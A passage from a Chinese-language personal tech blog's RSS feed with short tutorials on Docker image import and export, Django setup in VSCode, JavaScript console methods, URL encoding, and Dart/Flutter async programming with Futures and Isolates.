docker import &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;pwd&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;/newtomcat.tar newtomcat:v1.0
------------------------------------------------------
docker import /URL 新镜像名称&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;:版本号&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
docker import http://example.com/exampleimage.tgz example/imagerepo
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3docker-镜像的导出备份&#34;&gt;3.docker 镜像的导出备份&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;docker save -o 镜像导出文件&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;格式为tar压缩文件&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 镜像ID或镜像名称&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;:版本号&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
docker save -o &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;pwd&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;/mytomcat.tar newtomcat:v1.0
----------------------------------------------------------------------
docker save 镜像ID或镜像名称&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;:版本号&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &amp;gt; 镜像导出文件&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;格式为tar压缩文件&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
docker save newtomcat:v1.0 &amp;gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;pwd&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;/mytomcat.tar 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4docker-镜像的导入恢复&#34;&gt;4.docker 镜像的导入恢复&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;docker load -i 镜像导出文件&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;格式为tar压缩文件&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
docker load -i &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;pwd&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;/mytomcat.tar
--------------------------------------------------------------------
docker load &amp;lt; 镜像导出文件&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;格式为tar压缩文件&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
docker load &amp;lt; &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;pwd&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;/mytomcat.tar
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;5提交新镜像&#34;&gt;5.提交新镜像&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;docker commit &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;OPTIONS&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; CONTAINER &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;REPOSITORY&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;:TAG&lt;span style=&#34;color:#f92672&#34;&gt;]]&lt;/span&gt;
docker commit -a &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;runoob.com&amp;#34;&lt;/span&gt; -m &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;my apache&amp;#34;&lt;/span&gt; a404c6c174a2  mymysql:v1 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>VSCode—Django 项目</title>
        <link>https://ac-lm.github.io/posts/ide/vscodedjango-%E9%A1%B9%E7%9B%AE/</link>
        <pubDate>Thu, 26 Aug 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/ide/vscodedjango-%E9%A1%B9%E7%9B%AE/</guid>
        <description>&lt;h2 id=&#34;1环境配置&#34;&gt;1.环境配置&lt;/h2&gt;
&lt;p&gt;IDE 运行环境需有 Python 与 Django&lt;/p&gt;
&lt;h2 id=&#34;2项目创建&#34;&gt;2.项目创建&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;在终端以命令 &lt;code&gt;django-admin startproject XXXX&lt;/code&gt; 创建项目&lt;/li&gt;
&lt;li&gt;在 VSCode 的扩展管理栏 Extensions 下载 Python 与 Django 插件&lt;/li&gt;
&lt;li&gt;进入调试，添加 Python &amp;gt; Django&lt;/li&gt;
&lt;li&gt;完成配置，启动项目&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        <item>
        <title>Web开发—控制台输出</title>
        <link>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91%E6%8E%A7%E5%88%B6%E5%8F%B0%E8%BE%93%E5%87%BA/</link>
        <pubDate>Thu, 26 Aug 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91%E6%8E%A7%E5%88%B6%E5%8F%B0%E8%BE%93%E5%87%BA/</guid>
        <description>&lt;h2 id=&#34;1清空控制台&#34;&gt;1.清空控制台&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;console.clear()
clear()
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;2信息输出&#34;&gt;2.信息输出&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;console.log()         用于输出普通信息
console.info()         用于输出提示性信息
console.error()       用于输出错误信息
console.warn()       用于输出警示信息
console.debug()     用于输出调试信息
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;3换行&#34;&gt;3.换行&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;shift&lt;/code&gt; +  &lt;code&gt;enter&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;4占位符&#34;&gt;4.占位符&lt;/h2&gt;
&lt;p&gt;支持&lt;code&gt;字符 %s&lt;/code&gt;、&lt;code&gt;整数 %d %i&lt;/code&gt;、&lt;code&gt;浮点数 %f &lt;/code&gt;和&lt;code&gt;对象 %o &lt;/code&gt;四种&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;console.log(&#39;%d年%d月%d日&#39;, 2011,3,26); 
console.log(&#39;圆周率是%f&#39;, 3.1415926);
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;5断言&#34;&gt;5.断言&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;let isDebug = false;
console.assert(isDebug, &#39;为false时输出的信息&#39;);
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>随记—什么是 UrlEncode</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF-urlencode/</link>
        <pubDate>Thu, 26 Aug 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF-urlencode/</guid>
        <description>&lt;h2 id=&#34;1什么是-urlencode&#34;&gt;1.什么是 UrlEncode&lt;/h2&gt;
&lt;p&gt;UrlEncode 是一个函数，作用是将字符串以 URL 编码，是特定上下文的统一资源定位符（URL）的编码机制，最终使 HTML 数据安全提交。&lt;/p&gt;
&lt;p&gt;函数会将字符串以URL编码，例如空格编码为加号，常规网页中的表单数据传送就是用 UrlEncode 编码后再送出。&lt;/p&gt;
&lt;p&gt;部分转换规则如下：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;空格&lt;/th&gt;
&lt;th&gt;!&lt;/th&gt;
&lt;th&gt;#&lt;/th&gt;
&lt;th&gt;$&lt;/th&gt;
&lt;th&gt;%&lt;/th&gt;
&lt;th&gt;+&lt;/th&gt;
&lt;th&gt;@&lt;/th&gt;
&lt;th&gt;:&lt;/th&gt;
&lt;th&gt;=&lt;/th&gt;
&lt;th&gt;?&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;%20&lt;/td&gt;
&lt;td&gt;%21&lt;/td&gt;
&lt;td&gt;%23&lt;/td&gt;
&lt;td&gt;%24&lt;/td&gt;
&lt;td&gt;%25&lt;/td&gt;
&lt;td&gt;%2B&lt;/td&gt;
&lt;td&gt;%40&lt;/td&gt;
&lt;td&gt;%3A&lt;/td&gt;
&lt;td&gt;%3D&lt;/td&gt;
&lt;td&gt;%3F&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;2在asp&#34;&gt;2.在ASP&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Server.URLEncode(&amp;quot;内容&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;3在php&#34;&gt;3.在PHP&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;urlencode(&amp;quot;内容&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;4在jsp&#34;&gt;4.在JSP&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;URLEncoder.encode(&amp;quot;要转码的内容&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;5在python&#34;&gt;5.在Python&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;urllib.parse.unquote(&amp;quot;内容&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>Flutter—异步编程</title>
        <link>https://ac-lm.github.io/posts/flutter/flutter%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B/</link>
        <pubDate>Wed, 25 Aug 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/flutter/flutter%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://www.jianshu.com/p/0aefa62372c6&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Flutter 异步编程：Future、Isolate 和事件循环&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1dart-是一种单线程语言&#34;&gt;1.Dart 是一种单线程语言&lt;/h2&gt;
&lt;p&gt;Dart 是一种单线程语言，意味着同一时刻程序只能执行一个操作，其他操作在这个操作完成后执行，只要这个操作还在执行，它就不会被其他 Dart 代码中断。依赖于 Dart 的 Flutter 也是如此。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; myBigLoop(){
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1000000&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;){
        _doSomethingSynchronously();
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在上述例子中，&lt;code&gt;myBigLoop()&lt;/code&gt; 方法在执行完成前永远不会被中断，在整个方法执行期间应用将会被阻塞。&lt;/p&gt;
&lt;h2 id=&#34;2运行模型&#34;&gt;2.运行模型&lt;/h2&gt;
&lt;p&gt;在这里需要关注的是 Dart 的代码序列器（事件循环）。&lt;/p&gt;
&lt;p&gt;当你启动一个 Flutter 或 Dart 应用时，应用将创建并启动一个新的线程进程 Isolate，这个线程将是整个应用的主线程。&lt;/p&gt;
&lt;p&gt;在主线程启动后，应用会在此初始化 2 个 FIFO（先进先出）队列，&lt;code&gt;MicroTask&lt;/code&gt;和 &lt;code&gt;Event&lt;/code&gt;队列，在上述操作执行完成后，才会执行&lt;code&gt;main()&lt;/code&gt;方法，并启动事件循环。&lt;/p&gt;
&lt;p&gt;事件循环是一种由一个内部时钟控制的无限循环，在每个时钟周期内，如果没有其他 Dart 代码执行，则执行以下操作：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; eventLoop(){
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (microTaskQueue.isNotEmpty){
        fetchFirstMicroTaskFromQueue();
        executeThisMicroTask();
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
    }

    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (eventQueue.isNotEmpty){
        fetchFirstEventFromQueue();
        executeThisEventRelatedCode();
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可以注意到，这个操作的作用是从&lt;code&gt;MicroTask&lt;/code&gt;和 &lt;code&gt;Event&lt;/code&gt;队列提取出事件到循环中执行，直到两个队列中所有事件执行完成。&lt;/p&gt;
&lt;h3 id=&#34;amicrotask-队列&#34;&gt;a.MicroTask 队列&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;MicroTask&lt;/code&gt;队列用于非常简短且需要异步执行的内部动作，这些动作需要在其他事件完成之后并在将执行权送还给&lt;code&gt;Event&lt;/code&gt;队列之前运行。&lt;/p&gt;
&lt;h3 id=&#34;bevent-队列&#34;&gt;b.Event 队列&lt;/h3&gt;
&lt;p&gt;大多数需要使用异步的动作都使用&lt;code&gt;Event&lt;/code&gt;队列进行处理，如外部事件 I/O，绘图等。值得注意的是，Future 操作也通过&lt;code&gt;Event&lt;/code&gt;队列处理。&lt;/p&gt;
&lt;h2 id=&#34;3future&#34;&gt;3.Future&lt;/h2&gt;
&lt;p&gt;Future 是一个异步执行并且在未来的某一个时刻完成（或失败）的任务。Future 并非并行执行，而是遵循事件循环处理事件的顺序规则执行。当你实例化一个 Future 时，应用会执行以下操作：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;该 Future 的一个实例被创建并记录在由 Dart 管理的内部数组中；&lt;/li&gt;
&lt;li&gt;需要由此 Future 执行的代码直接推送到 Event 队列中去；&lt;/li&gt;
&lt;li&gt;该 Future 实例会返回一个状态（= incomplete）；&lt;/li&gt;
&lt;li&gt;如果存在下一个同步代码，执行它（非 Future 的执行代码）;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;只要事件循环从 Event 循环中获取它，被 Future 引用的代码将像其他任何 Event 一样执行。当该代码将被执行并将完成（或失败）时，&lt;code&gt;then()&lt;/code&gt; 或 &lt;code&gt;catchError()&lt;/code&gt; 方法将直接被触发。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; main(){
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Before the Future&amp;#39;&lt;/span&gt;);
    Future((){
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Running the Future&amp;#39;&lt;/span&gt;);
    }).then((_){
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Future is complete&amp;#39;&lt;/span&gt;);
    });
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;After the Future&amp;#39;&lt;/span&gt;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上述代码执行输出&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;Before the Future
After the Future
Running the Future
Future is complete
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;应用的执行执行流程如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;print(&amp;quot;Before the Future&amp;quot;)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;将 &lt;code&gt;(){print(&amp;quot;Running the Future&amp;quot;);}&lt;/code&gt; 添加到 &lt;code&gt;Event&lt;/code&gt; 队列；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;print(&amp;quot;After the Future&amp;quot;)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;事件循环获取（在第二步引用的）代码并执行它&lt;/li&gt;
&lt;li&gt;当代码执行时，它会查找 &lt;code&gt;then()&lt;/code&gt; 语句并执行它&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;4async&#34;&gt;4.Async&lt;/h2&gt;
&lt;p&gt;当你使用 async 关键字作为方法声明的后缀时，Dart 会将其理解为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;该方法的返回值是一个 Future；&lt;/li&gt;
&lt;li&gt;它同步执行该方法的代码直到第一个 await 关键字，然后它暂停该方法其他部分的执行；&lt;/li&gt;
&lt;li&gt;一旦由 await 关键字引用的 Future 执行完成，下一行代码将立即执行。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这是 Dart 异步代码的同步实现。注意到的是，async 并非并行执行，也是遵循事件循环处理事件的顺序规则执行。&lt;/p&gt;
&lt;h2 id=&#34;5多线程伪&#34;&gt;5.多线程（伪）&lt;/h2&gt;
&lt;p&gt;如何在 Flutter 中如何并行运行代码，这里我们可以使用 Isolate。&lt;/p&gt;
&lt;h3 id=&#34;aisolate-是什么&#34;&gt;a.Isolate 是什么？&lt;/h3&gt;
&lt;p&gt;Isolate 是 Dart 中的 线程。然而，它与常规「线程」的实现存在较大差异，Isolate 在 Flutter 中并不共享内存，不同 Isolate 之间通过消息进行通信，实际上 Isolate 更新进程。&lt;/p&gt;
&lt;h3 id=&#34;b每个-isolate-都有自己的事件循环&#34;&gt;b.每个 Isolate 都有自己的事件循环&lt;/h3&gt;
&lt;p&gt;每个 Isolate 都拥有自己的事件循环及队列。这意味着在一个 Isolate 中运行的代码与另外一个 Isolate 不会存在任何关联。&lt;/p&gt;
&lt;h3 id=&#34;c启动-isolate&#34;&gt;c.启动 Isolate&lt;/h3&gt;
&lt;h4 id=&#34;创建并握手&#34;&gt;创建并握手&lt;/h4&gt;
&lt;p&gt;由于Isolate 不共享任何内存并通过消息进行交互，因此，我们需要在调用者与 isolate 间建立通信。每个 Isolate 都暴露一个将消息传递给 Isolate 的被称为 SendPort 的端口，调用者和 isolate 需要互相知道彼此的端口才能进行通信。需要注意的是约束 isolate 的入口必须是顶级函数或静态方法。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dart&#34; data-lang=&#34;dart&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 新的 isolate 端口
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 该端口将在未来使用
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 用来给 isolate 发送消息
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;SendPort newIsolateSendPort;
&lt;span style=&#34;color:#75715e&#34;&gt;// 新 Isolate 实例
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;Isolate newIsolate;

&lt;span style=&#34;color:#75715e&#34;&gt;// 启动一个新的 isolate
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 然后开始第一次握手
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; callerCreateIsolate() &lt;span style=&#34;color:#66d9ef&#34;&gt;async&lt;/span&gt; {
    &lt;span style=&#34;color:#75715e&#34;&gt;// 本地临时 ReceivePort
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 用于检索新的 isolate 的 SendPort
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    ReceivePort receivePort &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ReceivePort();

    &lt;span style=&#34;color:#75715e&#34;&gt;// 初始化新的 isolate
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    newIsolate &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; Isolate.spawn(
        callbackFunction,
        receivePort.sendPort,
    );

    &lt;span style=&#34;color:#75715e&#34;&gt;// 检索要用于进一步通信的端口
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    newIsolateSendPort &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; receivePort.first;
}

&lt;span style=&#34;color:#75715e&#34;&gt;// 新 isolate 的入口
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; callbackFunction(SendPort callerSendPort){
    &lt;span style=&#34;color:#75715e&#34;&gt;// 一个 SendPort 实例，用来接收来自调用者的消息
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    ReceivePort newIsolateReceivePort &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ReceivePort();

    &lt;span style=&#34;color:#75715e&#34;&gt;// 向调用者提供此 isolate 的 SendPort 引用
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    callerSendPort.send(newIsolateReceivePort.sendPort);

    &lt;span style=&#34;color:#75715e&#34;&gt;//
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 进一步流程
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;//
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;向-isolate-提交消息&#34;&gt;向 Isolate 提交消息&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 向新 isolate 发送消息并接收回复的方法
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 在该例中，我将使用字符串进行通信操作
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// （发送和接收的数据）
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;Future&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;String&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sendReceive&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;String messageToBeSent&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; async &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color:#75715e&#34;&gt;// 创建一个临时端口来接收回复
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    ReceivePort port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ReceivePort&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;

    &lt;span style=&#34;color:#75715e&#34;&gt;// 发送消息到 Isolate，并且
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 通知该 isolate 哪个端口是用来提供回复的
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    newIsolateSendPort&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;
        CrossIsolatesMessage&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;String&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;(&lt;/span&gt;
            sender&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; port&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sendPort&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt;
            message&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; messageToBeSent&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;

    &lt;span style=&#34;color:#75715e&#34;&gt;// 等待回复并返回
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; port&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;first&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;// 扩展回调函数来处理接输入报文
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;callbackFunction&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SendPort callerSendPort&lt;span style=&#34;color:#f92672&#34;&gt;){&lt;/span&gt;
    &lt;span style=&#34;color:#75715e&#34;&gt;// 初始化一个 SendPort 来接收来自调用者的消息
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    ReceivePort newIsolateReceivePort &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ReceivePort&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;

    &lt;span style=&#34;color:#75715e&#34;&gt;// 向调用者提供该 isolate 的 SendPort 引用
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    callerSendPort&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;newIsolateReceivePort&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sendPort&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;

